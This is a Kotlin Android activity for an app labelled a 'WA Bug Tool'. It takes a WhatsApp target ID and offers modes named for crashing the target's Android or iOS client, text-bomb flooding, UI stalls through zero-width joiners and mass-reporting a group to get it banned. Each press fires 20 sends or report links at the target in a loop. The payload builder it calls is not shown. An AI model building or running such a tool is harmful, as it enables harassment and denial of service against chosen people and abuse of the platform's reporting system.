package com.hanz.wabench

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.*
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val root = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(40, 80, 40, 40) }
        root.addView(TextView(this).apply { text = "Hanz Bench v4"; textSize = 22f; setPadding(0, 0, 0, 24) })

        root.addView(TextView(this).apply { text = "WA Bug Tool:"; textSize = 16f; setPadding(0, 0, 0, 10) })
        val jid = EditText(this).apply { hint = "JID target (628xxx / xxx@g.us)" }
        root.addView(jid)

        val modes = listOf(
            "Android Crash (vCard + Emoji)", "iOS Crash (Bidi)", 
            "Delay High (Text Bomb)", "Delay Hard (Flood Mix)", 
            "UI Stall (ZWJ)", "Ban Group (Mass Report)"
        )
        val spinner = Spinner(this).apply { adapter = ArrayAdapter(this@MainActivity, android.R.layout.simple_spinner_dropdown_item, modes) }
        root.addView(spinner)

        val status = TextView(this).apply { text = "idle"; textSize = 13f; setPadding(0, 20, 0, 20) }
        val fire = Button(this).apply { text = "FIRE" }

        fire.setOnClickListener {
            val target = jid.text.toString().trim()
            if (target.isEmpty()) { status.text = "JID kosong"; return@setOnClickListener }
            val mode = spinner.selectedItemPosition
            status.text = "Firing..."
            val h = Handler(Looper.getMainLooper())
            var count = 0
            
            fun sendLoop() {
                if (count >= 20) { status.text = "Done."; return }
                count++
                if (mode == 5) {
                    val url = "https://wa.me/$target?report=report_spam"
                    try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) } catch (_: Exception) {}
                } else {
                    val payload = PayloadBuilder.generate(mode)
                    val intent = Intent(Intent.ACTION_SENDTO).apply {
                        data = Uri.parse("smsto:$target")
                        putExtra("jid", target)
                        putExtra(Intent.EXTRA_TEXT, payload)
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                    try { startActivity(intent) } catch (_: Exception) {}
                }
                status.text = "Sent $count/20"
                h.postDelayed(::sendLoop, 800L)
            }
            sendLoop()
        }
        root.addView(fire)
        root.addView(status)

        root.addView(TextView(this).apply { text = "Chat Global (Public Room):"; textSize = 16f; setPadding(0, 40, 0, 10) })
        val btnChat = Button(this).apply { text = "BUKA CHAT GLOBAL" }
        btnChat.setOnClickListener {
            val chatIntent = Intent(Intent.ACTION_VIEW, Uri.parse("https://tlk.io/hanzpublic"))
            startActivity(chatIntent)
        }
        root.addView(btnChat)

        setContentView(ScrollView(this).apply { addView(root) })
    }
}
